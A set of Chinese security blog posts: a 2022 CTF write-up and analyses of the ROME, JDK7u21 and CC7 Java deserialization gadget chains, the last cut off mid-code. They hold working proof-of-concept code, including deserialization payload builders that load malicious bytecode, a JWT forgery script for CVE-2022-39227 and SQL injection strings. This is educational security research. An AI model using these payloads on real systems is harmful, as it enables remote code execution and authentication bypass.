[{"content":"Web ezjava /myTest路由可以直接反序列化\n而且存在CC4.0，可以直接cc4打\nyso本地打通，但是远程打不了，发现是不出网的，这里打一个tomcat回显就可以了，拼接上CC4利用链\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.util.Base64; import java.util.PriorityQueue; import java.util.Queue; import javax.xml.transform.Templates; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import ysoserial.payloads.util.Reflections; public class CC4 { public static String base64Encode(byte[] bytes) { Base64.Encoder encoder = Base64.getEncoder(); return encoder.encodeToString(bytes); } public static byte[] serialize(Object obj) throws Exception { ByteArrayOutputStream btout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(btout); objOut.writeObject(obj); return btout.toByteArray(); } public static Object deserialize(byte[] serialized) throws Exception { ByteArrayInputStream btin = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(btin); Object o = objIn.readObject(); return o; } public static void main(String[] argss) throws Exception { Object templates = Evil.createTemplatesTomcatEcho(); ConstantTransformer constant = new ConstantTransformer(String.class); // mock method name until armed  Class[] paramTypes = new Class[]{String.class}; Object[] args = new Object[]{\u0026#34;su18\u0026#34;}; InstantiateTransformer instantiate = new InstantiateTransformer( paramTypes, args); // grab defensively copied arrays  paramTypes = (Class[]) Reflections.getFieldValue(instantiate, \u0026#34;iParamTypes\u0026#34;); args = (Object[]) Reflections.getFieldValue(instantiate, \u0026#34;iArgs\u0026#34;); ChainedTransformer chain = new ChainedTransformer(new Transformer[]{constant, instantiate}); // create queue with numbers  PriorityQueue\u0026lt;Object\u0026gt; queue = new PriorityQueue\u0026lt;Object\u0026gt;(2, new TransformingComparator(chain)); queue.add(1); queue.add(1); // swap in values to arm  Reflections.setFieldValue(constant, \u0026#34;iConstant\u0026#34;, TrAXFilter.class); paramTypes[0] = Templates.class; args[0] = templates; String b64 = base64Encode(serialize(queue)); System.out.println(b64); } }   Funweb 这个题目，找了好久的洞都没找到啥，后来仔细想了一下，这里用了jwt去做验证，而且获取admin权限是必须的，所以肯定得从jwt来下手，但是这里的jwt是用PS256算法的是非对称加密，不能直接爆破密钥，所以只能另寻他路，而这里爆出了个CVE-2022-39227\n jwcrypto accepts both compact and JSON formats. It was possible to use this to present a token with arbitrary claims with a signature from another valid token.\n 而且官方直接给了测试脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  from datetime import timedelta from json import loads, dumps from test.common import generated_keys from test import python_jwt as jwt from pyvows import Vows, expect from jwcrypto.common import base64url_decode, base64url_encode @Vows.batch class ForgedClaims(Vows.Context): \u0026#34;\u0026#34;\u0026#34; Check we get an error when payload is forged using mix of compact and JSON formats \u0026#34;\u0026#34;\u0026#34; def topic(self): \u0026#34;\u0026#34;\u0026#34; Generate token \u0026#34;\u0026#34;\u0026#34; payload = {\u0026#39;sub\u0026#39;: \u0026#39;alice\u0026#39;} return jwt.generate_jwt(payload, generated_keys[\u0026#39;PS256\u0026#39;], \u0026#39;PS256\u0026#39;, timedelta(minutes=60)) class PolyglotToken(Vows.Context): \u0026#34;\u0026#34;\u0026#34; Make a forged token \u0026#34;\u0026#34;\u0026#34; def topic(self, topic): \u0026#34;\u0026#34;\u0026#34; Use mix of JSON and compact format to insert forged claims including long expiration \u0026#34;\u0026#34;\u0026#34; [header, payload, signature] = topic.split(\u0026#39;.\u0026#39;) parsed_payload = loads(base64url_decode(payload)) parsed_payload[\u0026#39;sub\u0026#39;] = \u0026#39;bob\u0026#39; parsed_payload[\u0026#39;exp\u0026#39;] = 2000000000 fake_payload = base64url_encode((dumps(parsed_payload, separators=(\u0026#39;,\u0026#39;, \u0026#39;:\u0026#39;)))) return \u0026#39;{\u0026#34; \u0026#39; + header + \u0026#39;.\u0026#39; + fake_payload + \u0026#39;.\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;protected\u0026#34;:\u0026#34;\u0026#39; + header + \u0026#39;\u0026#34;, \u0026#34;payload\u0026#34;:\u0026#34;\u0026#39; + payload + \u0026#39;\u0026#34;,\u0026#34;signature\u0026#34;:\u0026#34;\u0026#39; + signature + \u0026#39;\u0026#34;}\u0026#39; class Verify(Vows.Context): \u0026#34;\u0026#34;\u0026#34; Check the forged token fails to verify \u0026#34;\u0026#34;\u0026#34; @Vows.capture_error def topic(self, topic): \u0026#34;\u0026#34;\u0026#34; Verify the forged token \u0026#34;\u0026#34;\u0026#34; return jwt.verify_jwt(topic, generated_keys[\u0026#39;PS256\u0026#39;], [\u0026#39;PS256\u0026#39;]) def token_should_not_verify(self, r): \u0026#34;\u0026#34;\u0026#34; Check the token doesn\u0026#39;t verify due to mixed format being detected \u0026#34;\u0026#34;\u0026#34; expect(r).to_be_an_error() expect(str(r)).to_equal(\u0026#39;invalid JWT format\u0026#39;)   我们把我们的jwt搞上去，把is_admin换成1就ok了\n1 2 3 4 5 6 7 8 9 10 11 12  from datetime import timedelta from json import loads, dumps import python_jwt as jwt from jwcrypto.common import base64url_decode, base64url_encode topic = \u0026#34;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcwOTkyNDUsImlhdCI6MTY2NzA5ODk0NSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiJteE9oWllCWTMwYW14bEhTUW4yczRRIiwibmJmIjoxNjY3MDk4OTQ1LCJwYXNzd29yZCI6ImEiLCJ1c2VybmFtZSI6ImEifQ.YL_7_6SwdxvUJm9W9WFRpKrITke0YfQlUDKDx06hifgVp0re7u5FUYSrChtN5trfVNzcWL-I9LNbtm_oLa3MUvxjbG6zJQSFMO6idOl3Wu5nZIRfNsg4RhNHrw4bZV9gf3D7Q4QsvCPcSDT9qXHjWnafZLAJ_y_Q8iZPAqbjaBV9FJ4vu3hjPH8vzN3d-v-39vqjVoQzSGJRz6dzQiBaZ8XGTD6qK8-AZ1xF-lEd02Lo1DD3MpJDUM7XXdPqC-tUnpIWYhaXI_1WNFbZWD6RunhdMJ_Ykt4u1GF7oYRBt12Q_uU106bSdosfPBQ-O2cfF8ewNe3K-RFKJtaVMUkt6A\u0026#34; [header, payload, signature] = topic.split(\u0026#39;.\u0026#39;) parsed_payload = loads(base64url_decode(payload)) parsed_payload[\u0026#39;is_admin\u0026#39;] = 1 parsed_payload[\u0026#39;exp\u0026#39;] = 2000000000 fake_payload = base64url_encode((dumps(parsed_payload, separators=(\u0026#39;,\u0026#39;, \u0026#39;:\u0026#39;)))) print(\u0026#39;{\u0026#34; \u0026#39; + header + \u0026#39;.\u0026#39; + fake_payload + \u0026#39;.\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;protected\u0026#34;:\u0026#34;\u0026#39; + header + \u0026#39;\u0026#34;, \u0026#34;payload\u0026#34;:\u0026#34;\u0026#39; + payload + \u0026#39;\u0026#34;,\u0026#34;signature\u0026#34;:\u0026#34;\u0026#39; + signature + \u0026#39;\u0026#34;}\u0026#39;)   下一步就是一个GraphQL注入，这个注入好像不算难，\n直接查询报错，提示getscoreusingid，但是只能是纯数字\n换成name试了一下，又报错发现这里有个getscoreusingnamehahaha\n然后就可以开始查询了\n查询版本\n1  1\u0026#39;+union+select+sqlite_version()+—   爆出users表\n1  1\u0026#39;+union+select+(select+name+from+sqlite_master+where+type%3d\u0026#39;table\u0026#39;+limit+0,1)+—   查出password1'+union+select+(select+password+from+users)+—\n登录获取flag\nMisc strange_forensics autopsy取证题目说flag1是用户密码，这里得去找shadow，由于只能搜关键词，我就直接搜shadow的特征了root:确实搜得到\n但是其实很多还是passwd，继续往下翻翻到了\n有一个bob用户的密码，这里爆破一下就可以了bob:$1$C5/bIl1n$9l5plqPKK4DjjqpGHz46Y/:19283:0:99999:7:::\n用hashcat爆了100万个爆破出来了\nkeyword扫描直接扫描出了flag3的明文Ux_forEnsIcs_MASTER\n现在就差flag2了autopsy好像没搜到什么\nstrings搜了一下敏感的关键字，发现这里是有个secret.zip，而且刚好在我们刚刚获取的用户密码bob的桌面上\n要dump文件出来，那就只能vol了，vol要dump出linux的东西，大概率扫不出imageinfo，所以得去自己找找系统搜了一下关键词，18.04\n找到了kernel版本号：Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007)\n现在系统就找到了，Ubuntu18.04.5 5.4.0-84-generic然后就是去做一个同版本Ubuntu的虚拟机了，这里更换内核版本\n搭建好相同环境的Ubuntu\n然后就开始制作profile\n然后拉进我们的vol就可以了\n就可以使用插件linux_recover_filesystem来跑出文件\n1  python vol.py -f /tmp/1.mem --profile=LinuxUbuntu_5_4_0-84-generic_profilex64 linux_recover_filesystem -D /tmp/ctf   这里的压缩包，打开发现是错误的\n010打开分析了一下猜测是加密位被改了，这里加密位改成09，然后发现压缩包正常，但是要密码\n爆破了一下，密码就是123456\n拿到flag2 _y0u_Ar3_tHe_LIn\n三个拼起来就是flag了但是交上去不对，看描述好像flag3还有点出入，又去autopsy搜了一下，果然有不一样的，这个交上去才是对的\nflag{890topico_y0u_Ar3_tHe_LInUx_forEnsIcS_MASTER}\n","date":"2022-10-31T10:27:38+08:00","permalink":"https://example.com/post/xyb2022/","title":"[2022祥云杯] wp"},{"content":"Gadget ysoserial利用的是ObjectBean\n1 2 3 4 5 6 7 8 9 10 11 12  * TemplatesImpl.getOutputProperties() * NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) * NativeMethodAccessorImpl.invoke(Object, Object[]) * DelegatingMethodAccessorImpl.invoke(Object, Object[]) * Method.invoke(Object, Object...) * ToStringBean.toString(String) * ToStringBean.toString() * ObjectBean.toString() * EqualsBean.beanHashCode() * ObjectBean.hashCode() * HashMap\u0026lt;K,V\u0026gt;.hash(Object) * HashMap\u0026lt;K,V\u0026gt;.readObject(ObjectInputStream)   依赖\n1 2 3 4 5 6 7  \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;rome\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;rome\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt;   利用链分析 这条链看起来很简单，gadget都没几层，ysoserial里代码都没几行\n可以看到最内层还是TemplatesImpl加载恶意字节码，而加载到字节码的关键点是ToStringBean的toString方法。\n首先getPropertyDescriptors会获取类的getter，这里我们获取TemplatesImpl的getOutputProperties\n然后在后面invoke执行，加载到我们恶意字节码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  private String toString(String prefix) { StringBuffer sb = new StringBuffer(128); try { // 获取getter，这里获取到getOutputProperties  PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass); if (pds != null) { for(int i = 0; i \u0026lt; pds.length; ++i) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { // invoke执行getOutputProperties  Object value = pReadMethod.invoke(this._obj, NO_PARAMS); this.printProperty(sb, prefix + \u0026#34;.\u0026#34; + pName, value); } } } }   而这里会发现，ToStringBean是有两个toSting方法的，我们需要控制this._obj是我们的TemplatesImpl\n我们继续往外跟，这里是ObjectBean.toString()，我们跟进去看看，可以看到ObjectBean他一下实现了三个Bean，而触发了他的toSting方法，就会执行到ToStringBean的toSting方法\n那么如何执行到ToStringBean的toSting方法呢，这里是用到了EqualsBean的beanHashCode，这里的this._obj就是ObjectBean\n1 2 3  public int beanHashCode() { return this._obj.toString().hashCode(); }   那么再往前跟，会发现执行beanHashCode的地方，居然又回到了ObjectBean，在ObjectBean的hashCode方法\n那触发hashCode的地方就分析多了，这里我们可以用一个HashMap.put就行了\nPOC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.ObjectBean; import javassist.ClassPool; import javassist.CtClass; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; public class ROME { public static byte[] serialize(Object obj) throws Exception { ByteArrayOutputStream btout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(btout); objOut.writeObject(obj); return btout.toByteArray(); } public static Object deserialize(byte[] serialized) throws Exception { ByteArrayInputStream btin = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(btin); Object o = objIn.readObject(); return o; } public static void setFieldValue(Object obj, String name, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzz = pool.get(\u0026#34;EvilTest\u0026#34;); byte[] code = clazzz.toBytecode(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, new byte[][]{code}); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ObjectBean delegate = new ObjectBean(Templates.class, templates); ObjectBean root = new ObjectBean(ObjectBean.class, delegate); HashMap\u0026lt;Object,Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(root, \u0026#34;123\u0026#34;); byte[] obj = serialize(hashMap); deserialize(obj); } }   其他利用链 为什么这分析了其他的利用链，因为有个题目，涉及到ROME的反序列化，但是他限制了payload的长度，而原来ysoserial的链子，用的都是ObjectBean，这个东西一下去实现了三个bean，所有payload会非常的长，所以涉及到了其他利用链的挖掘\n0x01 Hashtable gadget\n1 2 3 4 5 6 7  Hashtable.readObject() Hashtable.reconstitutionPut() AbstractMap.equals() EqualsBean.equals(TemplatesImpl) EqualsBean.beanEquals(TemplatesImpl) pReadMethod.invoke(_obj, NO_PARAMS) TemplatesImpl.getOutputProperties()   POC\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.EqualsBean; import javassist.ClassPool; import javassist.CtClass; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; public class ROME2 { public static byte[] serialize(Object obj) throws Exception { ByteArrayOutputStream btout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(btout); objOut.writeObject(obj); return btout.toByteArray(); } public static Object deserialize(byte[] serialized) throws Exception { ByteArrayInputStream btin = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(btin); Object o = objIn.readObject(); return o; } public static void setFieldValue(Object obj, String name, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzz = pool.get(\u0026#34;EvilTest\u0026#34;); byte[] code = clazzz.toBytecode(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, new byte[][]{code}); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); // 防止构造触发  EqualsBean bean = new EqualsBean(String.class, \u0026#34;s\u0026#34;); HashMap map1 = new HashMap(); HashMap map2 = new HashMap(); map1.put(\u0026#34;yy\u0026#34;, bean); map1.put(\u0026#34;zZ\u0026#34;, templates); map2.put(\u0026#34;yy\u0026#34;, templates); map2.put(\u0026#34;zZ\u0026#34;, bean); Hashtable table = new Hashtable(); table.put(map1, \u0026#34;1\u0026#34;); table.put(map2, \u0026#34;2\u0026#34;); // 反射插入恶意代码  setFieldValue(bean, \u0026#34;_beanClass\u0026#34;, Templates.class); setFieldValue(bean, \u0026#34;_obj\u0026#34;, templates); byte[] obj = serialize(table); deserialize(obj); } }   EqualBean他的beanEquals方法，也触发了invoke\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  public EqualsBean(Class beanClass, Object obj) { if (!beanClass.isInstance(obj)) { throw new IllegalArgumentException(obj.getClass() + \u0026#34; is not instance of \u0026#34; + beanClass); } else { this._beanClass = beanClass; this._obj = obj; } } public boolean equals(Object obj) { return this.beanEquals(obj); } public boolean beanEquals(Object obj) { Object bean1 = this._obj; Object bean2 = obj; boolean eq; ... ... try { PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass); if (pds != null) { for(int i = 0; eq \u0026amp;\u0026amp; i \u0026lt; pds.length; ++i) { Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { Object value1 = pReadMethod.invoke(bean1, NO_PARAMS); Object value2 = pReadMethod.invoke(bean2, NO_PARAMS); eq = this.doEquals(value1, value2); } } } ... ...   所以这里的关键就是执行到equals，执行到equals可以利用CC7里的Hashtable，利用Hashcode的碰撞来做\n这里我直接跟Hashtable.reconstitutionPut，反序列化时因为有两个元素，所以会触发两次，第一次把第一个HashMap存入，注意到这里计算hashCode，是对Map中每一个元素计算后相加\n然后在最后存入tab中，当第二个Map进入这个方法的时候，同样计算hashCode，由于两个Map的结果是一样的，所以能通过判断进入equals，这里就触发到了EqualsBean的equals方法了\n思考 可以发现，这里每一个map都插入了两个元素进去，这是为什么，CC7都不用，这里我调试了一下分析发现，这里EqualsBean的beanEquals这里要执行到下面的反射，必须得满足obj != null\n如果我们不给hashMap传两个值，那么就会导致AbstractMap的equals方法里，m.get拿不到值导致null\n这样就会让我们的EqualsBean进去equals的时候，没有参数，就别谈执行到恶意字节码了\n所以这里需要给每个Map加两个元素（单加一个算的hashCode不一样）\n1 2 3 4 5 6 7 8 9 10  HashMap map1 = new HashMap(); HashMap map2 = new HashMap(); map1.put(\u0026#34;yy\u0026#34;, bean); map1.put(\u0026#34;zZ\u0026#34;, templates); map2.put(\u0026#34;yy\u0026#34;, templates); map2.put(\u0026#34;zZ\u0026#34;, bean); Hashtable table = new Hashtable(); table.put(map1, \u0026#34;1\u0026#34;); table.put(map2, \u0026#34;2\u0026#34;);   ","date":"2022-10-26T10:49:50+08:00","permalink":"https://example.com/post/rome/","title":"[Java安全] ROME链分析"},{"content":"Gadget 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  LinkedHashSet.readObject() LinkedHashSet.add() ... TemplatesImpl.hashCode() (X) LinkedHashSet.add() ... Proxy(Templates).hashCode() (X) AnnotationInvocationHandler.invoke() (X) AnnotationInvocationHandler.hashCodeImpl() (X) String.hashCode() (0) AnnotationInvocationHandler.memberValueHashCode() (X) TemplatesImpl.hashCode() (X) Proxy(Templates).equals() AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() Method.invoke() ... TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() ClassLoader.defineClass() Class.newInstance() ... MaliciousClass.\u0026lt;clinit\u0026gt;() ... Runtime.exec()   利用链分析 这个利用链不需要依赖组件，原生的jre环境就可以利用了，看gadget可以发现，这里利用TemplatesImpl来进行恶意字节码的加载，而进入到TemplatesImpl的路径是动态代理\nAnnotationInvocationHandler 之前我们CC1学习到了动态代理，利用的是一个AnnotationInvocationHandler，他实现了InvocationHandler接口，是可以作为代理的，这里我代理我们的HashMap\nCC1走的是他的invoke里面的get，进而进入到LazyMap的get然后\n那么这里我们走的不是这里，而是后面的equalsImpl\n1 2 3 4 5 6 7 8  public Object invoke(Object var1, Method var2, Object[] var3) { String var4 = var2.getName(); Class[] var5 = var2.getParameterTypes(); if (var4.equals(\u0026#34;equals\u0026#34;) \u0026amp;\u0026amp; var5.length == 1 \u0026amp;\u0026amp; var5[0] == Object.class) { return this.equalsImpl(var3[0]); } else { assert var5.length == 0;   跟进看，这里会执行到invoke\n看链子是执行到了TemplatesImpl.getOutputProperties()，那么var1就是TemplatesImpl，var5就是getOutputProperties\nDynamic Proxy 那么回到头上，我们要执行到AnnotationInvocationHandler.invoke，这里我们就可以使用动态代理了\n被代理的对象执行方法的时候会转为调用invoke，那么我们衔接这个动态代理的方法就涉及到了LinkedHashSet了\nLinkedHashSet 首先从他的readobject进去分析，他自己没有实现readObject，但是他内部实现基于 HashMap，在 HashSet 的 writeObject() 方法中，会依次调用每个元素的 writeObject() 方法来实现序列化\n1 2 3 4 5 6 7  private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException { .... // Write out all elements in the proper order.  for (E e : map.keySet()) s.writeObject(e); }   相应的，在反序列化过程中，会依次调用每个元素的 readObject() 方法，然后将其作为 key (value 为固定值) 依次放入 HashMap 中（这里readObject的时候可能会触发put方法，但是并不影响我们利用链走向）\n1 2 3 4 5 6 7 8 9  private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { ... // Read in all elements in the proper order.  for (int i=0; i\u0026lt;size; i++) { E e = (E) s.readObject(); map.put(e, PRESENT); } }   可以看到这里最后走进了一个put方法\n跟进去put方法，这里可以看到就出现了equals了，而且出现了个很熟悉的东西：e.hash == hash\n这就和CC7里的那个一样，hashcode碰撞\n这个put方法，首先会调用内部 hash() 函数计算 key 的 hash 值，然后遍历所有元素，**当要插入的元素的 hash 和已有 entry 相同，且 key 和 Entry的 key 指向同一个对象 或 二者equals时 **，则认为 key 是否已经存在，返回 oldValue，否则调用 addEntry() 添加元素\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  public V put(K key, V value) { if (key == null) return putForNullKey(value); int hash = hash(key); int i = indexFor(hash, table.length); for (Entry\u0026lt;K,V\u0026gt; e = table[i]; e != null; e = e.next) { Object k; if (e.hash == hash \u0026amp;\u0026amp; ((k = e.key) == key || key.equals(k))) { V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; addEntry(hash, key, value, i); return null; }   可以发现，这里会比较LinkedHashSet的两个元素的hash，在这里也就是templatesimpl和proxy，那么如何让他们相等呢\n TemplateImpl的 hashCode() 是一个Native方法，每次运 行都会发生变化，我们理论上是无法预测的，所以想让proxy的 hashCode() 与之相等，只能寄希望于 proxy.hashCode() 。\n 而proxy调用hashCode方法，会跳转到AnnotationInvocationHandler#invoke，进而进入到AnnotationInvocationHandler#hashCodeImpl\n1 2 3 4 5 6 7 8  private int hashCodeImpl() { int result = 0; for (Map.Entry\u0026lt;String, Object\u0026gt; e : memberValues.entrySet()) { result += (127 * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue()); } return result; }   如果 Entry 的 value 的 Class 不为 Array，也就是当 memberValues 中只有一个key和一个value时，则 memberValueHashCode() 函数返回 value.hashCode()，在这里相当于\n1  127 * key.hashCode() ^ value.hashCode();   所以我们控制他的key.hashCode为0就好了，这样result结果就变成了value.hashCode()\n而这个hashCode为0的字符是存在的，这里可以用这个脚本来爆破\n1 2 3 4 5 6 7 8  public static void bruteHashCode() { for (long i = 0; i \u0026lt; 9999999999L; i++) { if (Long.toHexString(i).hashCode() == 0) { System.out.println(Long.toHexString(i)); } } }   这里可以用f5a5a608也是ysoserial用的字符\n那么会发现在第二次put的时候，计算的hash就是相同的了\n那么后面就接上了我们之前说的动态代理\n进入到Templatesimpl加载字节码\nPOC 有两个小点\n 先定义无害HashMap，在LinkHashSet完成add操作后再把恶意代码加进去 HashMap的value设定和LinkHashSet同款的TemplatesImpl对象来绕过hash  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70  import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.HashSet; import java.util.LinkedHashSet; import java.util.Map; public class JDK7u21 { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzz = pool.get(\u0026#34;EvilTest\u0026#34;); byte[] code = clazzz.toBytecode(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, new byte[][]{code}); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); String zeroHashCodeStr = \u0026#34;f5a5a608\u0026#34;; // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值  HashMap map = new HashMap(); map.put(zeroHashCodeStr, \u0026#34;1\u0026#34;); // 实例化AnnotationInvocationHandler类  Constructor handlerConstructor = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class, Map.class); handlerConstructor.setAccessible(true); InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map); // 为tempHandler创造一层代理  Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler); // 实例化HashSet，并将两个对象放进去  HashSet set = new LinkedHashSet(); set.add(templates); set.add(proxy); // 将恶意templates设置到map中  map.put(zeroHashCodeStr, templates); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(set); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } }   思考 这个链子算是我前几个分析过来比较复杂的，对于这个链子，我有几个思考，这里我打算详细的去跟进程序分析一下\n看POC首先是他用了个HashMap，为什么这里要利用这么一个HashMap？\n这里我对POC进行调试，发现readObject的时候，触发了两次put，顺序为：TemplatesImpl -\u0026gt; proxy\n在第一次的put中，然后key通过addEntry()存入table中\n那么第二次proxy进去的put的时候，我们再debug分析一下，因为这里我们是使用AnnotationInvocationHandler来代理了HashMap\n所以这里的Templates是这样的，HashMap的键为f5a5a608，值为TemplatesImpl对象\n1  @javax.xml.transform.Templates(f5a5a608=com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl@18c78bdb)   我们跟进他的hash计算，这里进入hashCode()\n因为是代理，所以进了invoke，执行的方法是hashCode，所以进入了hashCodeImpl\n这里因为只有一对键值对，所以算法简化成127 * key.hashCode() ^ value.hashCode();\n那么重点就来了，这里key是我们精心构造的，他的hashCode()结果为0，而这个value，我们为他设置的是恶意的TemplatesImpl对象，重要的是这个TemplatesImpl对象和LinkedHashSet第一个put的是同款，所以导致了LinkedHashSet的两个对象，他们的hashcode是一样的\n","date":"2022-10-24T17:46:10+08:00","permalink":"https://example.com/post/jdk7u21/","title":"[Java安全] Jdk7u21链分析"},{"content":"gadget 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  Gadget chain: Hashtable.readObject Hashtable.reconstitutionPut AbstractMapDecorator.equals AbstractMap.equals LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec()   利用链分析 CC7的关键点是利用到AbstractMap的equals方法去触发到LazyMap的get方法进而触发transform方法进入利用链\n和CC1一样构造ChainedTransformer来执行命令\n1 2 3 4 5 6 7 8 9 10 11 12 13  Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new 